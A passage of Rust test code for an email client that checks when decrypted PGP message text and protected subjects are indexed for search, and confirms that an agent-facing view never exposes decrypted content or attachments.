        store.set_source(folder, 1, raw.as_bytes()).unwrap();
        folder
    };
    let found = |no_decrypted: bool| {
        let search = Search {
            scope: Scope::Everywhere,
            show: Show::All,
            text: "zebrafish".into(),
            no_decrypted,
            ..Default::default()
        };
        w.core.search(&search, Sort::default(), 0, 10).unwrap().len()
    };
    let encrypted = |text: &str| {
        let search = Search {
            scope: Scope::Everywhere,
            show: Show::All,
            text: text.into(),
            ..Default::default()
        };
        w.core.search(&search, Sort::default(), 0, 10).unwrap().len()
    };
    assert_eq!(encrypted("is:encrypted"), 1);
    assert_eq!(encrypted("is:signed"), 0);
    assert_eq!(found(false), 0, "not opened yet");
    assert!(w.core.pgp_index_encrypted().unwrap(), "on out of the box");
    let view = w.core.message_view(folder, 1, false).unwrap().unwrap();
    assert!(shown(&view).contains("zebrafish"));
    assert_eq!(found(false), 1, "opened: its text is searched");
    assert_eq!(found(true), 0, "but never by an agent");
    let agent = w.core.agent_message(folder, 1).unwrap().unwrap();
    assert!(
        !agent.written.contains("zebrafish") && agent.written.contains("encrypted"),
        "{agent:?}"
    );
    assert!(agent.attachments.is_empty() && agent.earlier.is_empty());
    // nor its attachments, which would be decrypted
    assert!(w.core.agent_attachment(folder, 1, 0).is_err());
    assert_eq!(agent.from, "alice@example.org");
    // turned off: forgotten, and not indexed again when opened
    w.core.set_pgp_index_encrypted(false).unwrap();
    assert_eq!(found(false), 0);
    assert_eq!(encrypted("alice"), 1, "its sender is still searched");
    w.core.message_view(folder, 1, false).unwrap().unwrap();
    assert_eq!(found(false), 0);
}

/// Opened, an encrypted message with a protected Subject is listed by it, and by the one it came with again once
/// the switch in Settings is off
#[test]
fn the_list_shows_the_protected_subject_once_opened() {
    use pe_core::{Scope, Search, Show};
    let w = world("pgp-list-subject");
    let inner =
        "Content-Type: text/plain; charset=utf-8; protected-headers=\"v1\"\r\nSubject: The real subject\r\n\r\nBody";
    let raw = message(
        "alice@example.org",
        &encrypted_part(inner, &[&w.me], Some(&w.alice), "e"),
    )
    .replacen("Subject: Test", "Subject: ...", 1);
    let folder = {
        let store = Store::open(w.dir.path().join("store.db")).unwrap();
        let account = store.accounts().unwrap()[0].id;
        let inbox = pe_store::FolderInfo {
            path: "INBOX".into(),
            name: "INBOX".into(),
            selectable: true,
            ..Default::default()
        };
        store.set_folders(account, &[inbox]).unwrap();
        let folder = store.folders(account).unwrap()[0].id;
        let info = pe_store::MessageInfo {
            uid: 1,
            subject: "...".into(),
            from_address: "alice@example.org".into(),
            protection: pe_store::Protection::Encrypted,
            ..Default::default()
        };
        store.add_messages(folder, &[info]).unwrap();
        store.set_source(folder, 1, raw.as_bytes()).unwrap();
        folder
    };
    let subject = || {
        let search = Search {
            scope: Scope::Folder(folder),
            show: Show::All,
            ..Default::default()
        };
        w.core.search(&search, pe_store::Sort::default(), 0, 1).unwrap()[0]
            .info
            .subject
            .clone()
    };
    assert_eq!(subject(), "...");
    w.core.message_view(folder, 1, false).unwrap().unwrap();
    assert_eq!(subject(), "The real subject");
    w.core.set_pgp_index_encrypted(false).unwrap();
    assert_eq!(subject(), "...");
}
